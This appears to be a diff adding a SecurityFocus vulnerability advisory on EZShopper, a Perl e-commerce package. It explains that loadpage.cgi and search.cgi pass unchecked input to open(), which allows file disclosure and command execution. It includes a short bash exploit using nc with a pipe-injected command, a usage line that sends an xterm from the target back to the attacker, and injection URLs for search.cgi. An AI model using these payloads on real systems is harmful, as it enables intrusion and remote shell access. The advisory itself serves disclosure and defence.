@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/1014/info
+
+EZShopper is a perl-based E-Commerce software package offered by Alex Heiphetz Group, Inc. It is possible to remotely compromise a host due to a lack of checks on user input passed directly to the open() call. This vulnerability exists in two scripts shipped with EZShopper, loadpage.cgi and search.cgi. 
+
+In the first vulnerability, the variable passed to open() is called "file" and is submitted to a script called loadpage.cgi. There are no checks on "file", meaning that if "../" preceed an arbitrary filename/path as the file variable, those "../" paths will be followed and the arbitrary file anywhere on the filesystem will be displayed (provided that the uid of the webserver has access to them..). If pipes are included in the variable, arbitrary commands can be executed on the target host possibly giving remote access to the attacker with the uid of the webserver (usually 'nobody'). 
+
+The second vulnerability is identical in nature to the first but is in the "search.cgi" script. In search.cgi, no checks are made on user input variables 'template' and 'database' (passed to open()). As a result, it is possible to view files or execute commands on the host through search.cgi as well.
+
+#!/bin/bash 
+echo -e "GET http: //www.example.com/cgi-bin/loadpage.cgi?user_id=1&file=|"$1"| HTTP/1.0\n\n" | nc proxy.server.com 8080
+
+[ /cut ]
+
+$ ./ezhack.sh /usr/X11R6/bin/xterm%20-display%
+
+(this would send an xterm from the target host to wherever display is)
+
+http: //www.example.com/cgi-bin/search.cgi?user_id=1&database=<insert here>&template=<or insert here>&distinct=1
